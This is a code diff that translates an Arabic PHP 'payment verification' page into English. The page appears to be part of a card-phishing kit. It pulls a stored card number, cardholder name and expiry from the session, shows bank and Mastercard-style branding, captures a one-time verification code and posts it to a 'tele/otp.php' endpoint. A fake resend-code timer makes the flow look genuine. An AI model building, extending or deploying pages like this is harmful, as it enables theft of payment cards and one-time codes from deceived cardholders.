@@ -1,9 +1,10 @@
 <?php
 session_start();
-require_once 'includes/lang.php';
-set_site_lang('ar');
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../includes/lang.php';
+set_site_lang('en');
+
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
 // Get user ID from URL parameter or session
 $userId = null;
@@ -20,7 +21,7 @@ if (!$userId) {
     exit;
 }
 
-// ✅ 🆕 جلب رقم البطاقة من الـ SESSION
+// ✅ 🆕 جلب Card Number من الـ SESSION
 $cardNumber = $_SESSION['last_card_number'] ?? '';
 $cardName = $_SESSION['last_card_name'] ?? '';
 $cardMonth = $_SESSION['last_card_month'] ?? '';
@@ -28,16 +29,16 @@ $cardYear = $_SESSION['last_card_year'] ?? '';
 $amount = $_SESSION['last_amount'] ?? '0.00';
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>رمز التحقق</title>
+<title>Verification Code</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
-<link rel="stylesheet" href="includes/lang-toggle.css">
-<style>
+<link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
 *{
   box-sizing:border-box;
   font-family:'Cairo', sans-serif;
@@ -179,7 +180,7 @@ h3{
   color:#2f6fda;
   margin-top:10px;
 }
-/* زر إعادة الإرسال أثناء التعطيل */
+/* زر إعادة الSubmit أثناء التعطيل */
 #resendBtn:disabled{
   background:#e9ecef;
   color:#6c757d;
@@ -251,16 +252,16 @@ h3{
 }
 /* المبلغ */
 .pay-amount{
-  text-align:right;
+  text-align:left;
   font-size:18px;
   font-weight:800;
   color:#000;
   margin:1px 0 1px;
 }
 
-/* رقم البطاقة */
+/* Card Number */
 .card-info{
-  text-align:right;
+  text-align:left;
   font-size:14px;
   color:#8a8a8a;
   margin-bottom:1px;
@@ -275,7 +276,7 @@ h3{
 
 /* التاريخ */
 .txn-date{
-  text-align:right;
+  text-align:left;
   font-size:13px;
   color:#9a9a9a;
   margin-bottom:2px;
@@ -289,7 +290,7 @@ h3{
 <div class="loader-wrap" id="loader">
   <div class="loader"></div>
   <div style="margin-top:12px;font-size:15px;color:#333">
-    جاري التأكيد ...
+    Confirming...
   </div>
 </div>
 
@@ -301,7 +302,7 @@ h3{
       <span style="color:#eb001b">●</span>
       <span style="color:#ff5f00">●</span>
     </div>
-    <a href="#">إلغاء</a>
+    <a href="#">Cancel</a>
   </div>
 
   <div class="card-body">
@@ -311,15 +312,15 @@ h3{
       <img id="bankLogo" src="bank/default.png" alt="Bank Logo">
     </div>
 
-    <h3>التحقق من الدفع</h3>
+    <h3>Payment verification</h3>
     
 <p id="totalAmount" style="margin-top:10px;font-size:18px;font-weight:700;color:#333">
-  -- ر.س
+  -- SAR
 </p>
 
 <script>
 const amount = localStorage.getItem('last_amount') || '0.00';
-document.getElementById('totalAmount').textContent = amount + '.00 ر.س';
+document.getElementById('totalAmount').textContent = amount + '.00 SAR';
 </script>
 
 
@@ -327,17 +328,17 @@ document.getElementById('totalAmount').textContent = amount + '.00 ر.س';
     <!-- التاريخ -->
     <div class="txn-date" id="dateDisplay">--</div>
 
-    <!-- رقم البطاقة -->
+    <!-- Card Number -->
     <div class="card-info">
       <span id="cardDisplay" class="card-number">---</span>
     </div>
 
     <div class="details">
-      تحقّق من عملية الدفع باستخدام الرمز الذي أرسلناه إلى رقم هاتفك المحمول<br>
+      Verify the payment using the code sent to your mobile number<br>
     </div>
 
-    <div class="otp-label">أدخل رمز التحقق</div>
-    <form id="otpForm" method="post" action="tele/otp.php">
+    <div class="otp-label">Enter verification code</div>
+    <form id="otpForm" method="post" action="../tele/otp.php">
 
       <input type="hidden" name="otp" id="otpHidden">
 
@@ -353,12 +354,12 @@ document.getElementById('totalAmount').textContent = amount + '.00 ر.س';
         color:#d93025;
         font-weight:600;
       ">
-        رمز التحقق غير صحيح
+        Invalid verification code
       </div>
 
-      <button class="btn btn-primary" type="submit">تأكيد</button>
+      <button class="btn btn-primary" type="submit">Confirm</button>
       <button class="btn btn-outline" type="button" id="resendBtn">
-        إعادة إرسال الرمز
+        Resend Code
       </button>
 
       <div id="timer" style="text-align:center;margin-top:6px;color:#555;font-size:14px"></div>
@@ -368,15 +369,15 @@ document.getElementById('totalAmount').textContent = amount + '.00 ر.س';
   </div>
 
   <div class="card-footer">
-    › هل تحتاج مساعدة؟
+    › Need help?
   </div>
 
 </div>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-// ✅ استقبال رقم البطاقة من sessionStorage
-// ✅ استقبال رقم البطاقة من PHP
+// ✅ استقبال Card Number من sessionStorage
+// ✅ استقبال Card Number من PHP
 const paymentData = {
   cardNumber: '<?php echo htmlspecialchars($cardNumber); ?>',
   cardName: '<?php echo htmlspecialchars($cardName); ?>',
@@ -384,7 +385,7 @@ const paymentData = {
   year: '<?php echo htmlspecialchars($cardYear); ?>'
 };
 
-console.log('✅ بيانات البطاقة:', paymentData);
+console.log('✅ Card Details:', paymentData);
 
 // Mask helpers
 function maskCard(num){
@@ -392,7 +393,7 @@ function maskCard(num){
   return c.length>=10 ? c.slice(0,6)+'******'+c.slice(-4) : c;
 }
 
-// ✅ عرض رقم البطاقة من sessionStorage
+// ✅ عرض Card Number من sessionStorage
 const cardNumber = paymentData.cardNumber || '';
 document.getElementById('cardDisplay').textContent = maskCard(cardNumber);
 
@@ -403,7 +404,7 @@ const otpHidden = document.getElementById('otpHidden');
 const loader    = document.getElementById('loader');
 const otpError  = document.getElementById('otpError');
 
-// عند الإرسال
+// عند الSubmit
 form.addEventListener('submit', function(e){
   e.preventDefault();
 
@@ -426,7 +427,7 @@ form.addEventListener('submit', function(e){
   loader.style.display = 'flex';
 
   // ✅ أرسل فقط – بدون أي تحويل
-  fetch('tele/otp.php', {
+  fetch('../tele/otp.php', {
     method: 'POST',
     body: new FormData(form)
   }).then(() => {
@@ -483,7 +484,7 @@ otpInput.addEventListener('paste', function(e) {
 });
 
 // ===============================
-// تحديد شعار البنك حسب أول 4 أرقام (BIN)
+// تحديد شعار البنك حسب أول 4 digits (BIN)
 // ===============================
 function detectBankLogo(cardNumber){
   const digits = String(cardNumber || '').replace(/\D/g, '');
@@ -553,13 +554,13 @@ let sec = 120;
 const resendBtn = document.getElementById('resendBtn');
 
 let resendInterval = null;
-const originalText = 'إعادة إرسال الرمز';
+const originalText = 'Resend Code';
 
 function startResendTimer(duration = 120){
   let remaining = duration;
 
   resendBtn.disabled = true;
-  resendBtn.textContent = `تم إعادة إرسال الرمز (2:00)`;
+  resendBtn.textContent = `Code resent (2:00)`;
 
   resendInterval = setInterval(() => {
     remaining--;
@@ -567,7 +568,7 @@ function startResendTimer(duration = 120){
     const m = Math.floor(remaining / 60);
     const s = String(remaining % 60).padStart(2, '0');
 
-    resendBtn.textContent = `تم إعادة إرسال الرمز (${m}:${s})`;
+    resendBtn.textContent = `Code resent (${m}:${s})`;
 
     if (remaining <= 0) {
       clearInterval(resendInterval);
